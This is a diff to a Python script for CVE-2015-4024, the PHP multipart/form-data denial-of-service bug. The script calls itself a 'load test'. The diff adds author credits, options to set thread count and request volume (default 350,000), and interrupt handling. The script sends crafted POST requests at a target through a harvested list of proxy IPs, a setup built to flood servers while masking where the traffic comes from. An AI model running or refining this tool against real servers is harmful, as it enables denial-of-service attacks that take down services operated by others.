@@ -1,4 +1,12 @@
 #!/usr/bin/env python3
+# coding:utf-8
+# Author:  Shusheng Liu,The Department of Security Cloud, Baidu --<liusscs@163.com>
+# Author:  typcn --<http://blog.eqoe.cn>
+# Author:  Beining --<http://www.cnbeining.com/>
+# Purpose: PHP Multiprocess load test script (CVE-ID2015-4024 , bug #69364)
+# Created: 05/20/2015
+
+# WARNING: USE THIS TOOL AT YOUR OWN RISK
 # -*- coding: utf-8 -*-
 
 '''
@@ -8,6 +16,10 @@ email: liusscs@163.com
 Multiprocessing and proxy
 Author: typcn
 Welcome to http://blog.eqoe.cn
+
+Some error handling
+Author: Beining
+http://www.cnbeining.com
 
 WARNING: USE THIS TOOL AT YOUR OWN RISK
 注意：此工具造成的任何后果由使用者自行承担
@@ -33,9 +45,9 @@ import threading
 import time
 import random
 
-# change variables below to modify requests' number and workers' number
+# Just put it here for now
 request_num = 350000
-worker_num = 500
+#worker_num = 500
 
 
 def check_php_multipartform_dos(url, post_body, headers, ip):
@@ -95,9 +107,22 @@ def main():
                       default=False,
                       type="string",
                       help="test target")
+    parser.add_option("-x", "--thread", action="store",
+                      dest="thread",
+                      default=250,
+                      type="int",
+                      help="thread")
+    parser.add_option("-r", "--request_num", action="store",
+                      dest="request_num",
+                      default= 350000,
+                      type="int",
+                      help="request_num")
+    
     (options, args) = parser.parse_args()
     if options.target:
         target = options.target
+        thread = options.thread
+        request_num = options.request_num
     else:
         return
 
@@ -125,13 +150,20 @@ def main():
     print("starting...")
 
     getting_list()
-
-    pool = Pool(worker_num)
-    for ip in IP_Port:
-        pool.apply_async(check_php_multipartform_dos,
-                         [target, body, headers, ip])
-    pool.close()
-    pool.join()
+    
+    try:
+    
+    
+        pool = Pool(thread)
+        for ip in IP_Port:
+            pool.apply_async(check_php_multipartform_dos,
+                             [target, body, headers, ip])
+        pool.close()
+        pool.join()
+    except KeyboardInterrupt:
+        print('EXIT')
+        exit()
 
 if __name__ == "__main__":
     main()
+    exit()
